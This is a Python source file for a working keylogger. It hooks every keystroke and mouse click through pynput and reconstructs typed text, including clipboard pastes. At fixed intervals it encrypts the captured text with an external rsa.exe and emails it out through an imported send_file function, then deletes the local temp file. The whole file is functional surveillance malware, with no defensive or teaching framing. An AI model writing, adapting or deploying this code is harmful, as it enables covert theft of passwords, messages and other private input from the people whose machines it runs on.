from threading import Lock,Thread
from pathlib import Path
from pynput import keyboard
from pynput import mouse
import pyperclip
import time
from subprocess import call
from mail import send_file
import os

words =[]
lock =Lock()
WORDS_LIMIT = 10
TIME_LIMIT = 60*15

def email_thread():
    global TIME_LIMIT,WORDS_LIMIT,words
    currTime = TIME_LIMIT
    while(True):
        time.sleep(1)
        currTime -= 1
        lock.acquire()
        if currTime <= 0 or len(words)>= WORDS_LIMIT:
            currTime = TIME_LIMIT
            file = open("tmp.txt",'w')
            for word in words:
                file.write(str(word)+'\n')
            file.close()
            call(["./rsa.exe", "10527635191", "135", "1","tmp.txt","out.rsa"])
            send_file("out.rsa")
            if os.path.isfile("tmp.txt"):
                os.remove("tmp.txt")
            words.clear()
        lock.release()
        

class KeyObjectConst:
    """
    bit switches
    """
    bit_type = 31
    bit_mod = 30
    bit_numpad = 29
    bit_caps_enabled = 28
    """
    focus changer mod keys / mouse buttons
    """
    focus_keys = [keyboard.Key.tab, keyboard.Key.enter]
    focus_mouse_buttons = [0]


class KeyObject(KeyObjectConst):
    """
    x = 00000000 00000000 00000000 00000000
    first 8-bit : the key value char or numberpad number or mouse button
    second 8-bit : unused so far ..
    third 8-bit :  unused so far ..
    forth 8-bit : used for some flags
    """

    def __init__(self):
        self.x = 0

    def toBytes(self):
        return self.x.to_bytes(4, "big")

    def fromBytes(self, f):
        self.x.from_bytes(f.read(4), "big")

    def fromKeyboard(self, key: keyboard.Key, caps_enabled: bool):
        self.x = 0
        self.x |= 1 << self.bit_type
        if isinstance(key, keyboard.KeyCode):
            if caps_enabled:
                self.x |= 1 << self.bit_caps_enabled

            if key.char is not None:
                self.x |= ord(key.char)
                self.x |= 0 << self.bit_numpad
            elif hasattr(key, 'vk') and 96 <= key.vk <= 105:
                # numpad keys , fk python
                self.x |= ord('0') + key.vk - 96
                self.x |= 1 << self.bit_numpad
            elif hasattr(key, 'vk') and 48 <= key.vk <= 57:
                # numpad keys , fk python
                self.x |= ord('0') + key.vk - 48
                self.x |= 1 << self.bit_numpad
            else:
                print("wtf is this key my guy ??")
        else:
            self.x |= key._value_.vk  # again , fk python
            self.x |= 1 << self.bit_mod
            # store the index+1 in the second 8-bits cuz I can
            # also can check for it if its not equal zero then
            # its a focus changer key
            i = 1
            for k in self.focus_keys:
                if k == key:
                    self.x |= i << 8
                    break
                i = i + 1

    def fromMouse(self, key: mouse.Button):
        self.x = 0
        self.x |= 0 << self.bit_type
        val = 255
        if key == mouse.Button.left:
            val = 0
        elif key == mouse.Button.right:
            val = 1
        elif key == mouse.Button.middle:
            val = 2
        self.x |= val

    def isKeyboardKey(self):
        return self.x & (1 << self.bit_type) != 0

    def isMouseKey(self):
        return not self.isKeyboardKey()

    def isCharKey(self):
        return self.isKeyboardKey() and self.x & (1 << self.bit_mod) == 0

    def isModKey(self):
        return self.isKeyboardKey() and not self.isCharKey()

    def getModKeyNumber(self):
        return self.x & 0x000000ff

    def isNumpad(self):
        return self.isKeyboardKey() and self.x & (1 << self.bit_numpad) != 0

    def getChar(self):
        if not self.isKeyboardKey():
            return -1
        return chr(self.x & 0x000000ff)

    def isCapsEnabled(self):
        if not self.isKeyboardKey():
            return False
        return self.x & (1 << self.bit_caps_enabled) != 0

    def getMouseButton(self):
        if self.isKeyboardKey():
            return -1
        return self.x & 0x000000ff

    def isFocusChangerKey(self):
        if self.isMouseKey():
            return self.getMouseButton() in self.focus_mouse_buttons
        else:
            return (self.x & 0x000000ff << 8) != 0

    def isCommand(self):
        if self.isKeyboardKey() and self.isCharKey() and not self.isNumpad():
            return self.x & 0xff < 30

        return False

    def print(self):
        if self.isKeyboardKey():
            if self.isCharKey():
                if self.isNumpad():
                    print("keyboard{type=char(numpad) , value=", self.getChar(), "}")
                elif self.isCommand():
                    print("keyboard{type=char(cmd) , value=", self.x & 0xff, "}")
                else:
                    print("keyboard{type=char , value=", self.getChar(), " , capped=", self.isCapsEnabled(), " }")
            else:
                print("keyboard{type=mod , focus=", self.isFocusChangerKey(), "}")
        else:
            print("mouse{value=", self.getMouseButton(), ", focus=", self.isFocusChangerKey(), "}")


class VirtualTextFieldObject:
    def __init__(self, submit):
        self.text = ""
        self.func = submit
        self.pos = 0
        self.capped = False
        self.num_lock = True
        self.selection = False

    def reset_text(self):
        self.pos = 0
        self.text = ""
        self.selection = False

    def reset(self):
        self.pos = 0
        self.capped = False
        self.num_lock = True
        self.text = ""
        self.selection = False

    def onKey(self, key: KeyObject):
        if key.isKeyboardKey():
            if key.isCharKey():
                if key.isCommand():
                    if key.getModKeyNumber() == 1:
                        self.selection = True
                    elif key.getModKeyNumber() == 0x16:
                        data = None
                        try:
                            time.sleep(0.2)
                            data = pyperclip.paste()
                        except any:
                            pass
                        if isinstance(data, str):
                            self.text = self.text[:self.pos] + data + self.text[self.pos:]
                            self.pos += len(data)
                else:
                    if self.selection:
                        self.reset_text()

                    c = key.getChar()
                    if self.capped:
                        # switch from upper to lower and vice-versa
                        val = ord(c)
                        if ord('a') <= val <= ord('z'):
                            val = val - ord('a') + ord('A')
                        elif ord('A') <= val <= ord('Z'):
                            val = val - ord('A') + ord('a')
                        c = chr(val)

                    self.text = self.text[:self.pos] + c + self.text[self.pos:]
                    self.pos += 1
            elif key.isModKey():
                if key.isFocusChangerKey():
                    self.func(self.text)
                    self.reset_text()

                else:
                    if self.selection:
                        self.reset_text()
                        return

                    match key.getModKeyNumber():
                        case keyboard.Key.caps_lock._value_.vk:
                            self.capped = not self.capped
                        case keyboard.Key.right._value_.vk:
                            if len(self.text) > self.pos:
                                self.pos += 1
                                # print(self.pos)
                        case keyboard.Key.left._value_.vk:
                            if 0 < self.pos:
                                self.pos -= 1
                                # print(self.pos)
                        case keyboard.Key.space._value_.vk:
                            self.text = self.text[:self.pos] + ' ' + self.text[self.pos:]
                            self.pos += 1
                        case keyboard.Key.delete._value_.vk:
                            if self.pos < len(self.text):
                                self.text = self.text[:self.pos] + self.text[self.pos + 1:]
                        case keyboard.Key.backspace._value_.vk:
                            if self.pos > 0:
                                self.text = self.text[:self.pos - 1] + self.text[self.pos:]
                                self.pos -= 1
                        case default:
                            pass
                pass
        else:
            self.func(self.text)
            self.reset_text()


def textHandler(text):
    if len(text) == 0:
        return
    global words
    lock.acquire()
    words.append(str(text))
    lock.release()
    print(f"submitted: \"{text}\"")


textfield = VirtualTextFieldObject(textHandler)


def handleKey(x):
    global textfield

    r = KeyObject()
    r.fromKeyboard(x, False)
    textfield.onKey(r)


def handleMouseKey(x, y, button, pressed):
    if not pressed:
        return
    r = KeyObject()
    r.fromMouse(button)
    textfield.onKey(r)


if __name__ == "__main__":
    # print("Cache Dir : " + tmp)

    listener = keyboard.Listener(on_press=handleKey)
    listener.start()

    listener2 = mouse.Listener(on_click=handleMouseKey)
    listener2.start()
    
    email_sender = Thread(target = email_thread)
    email_sender.start()

    listener.join()
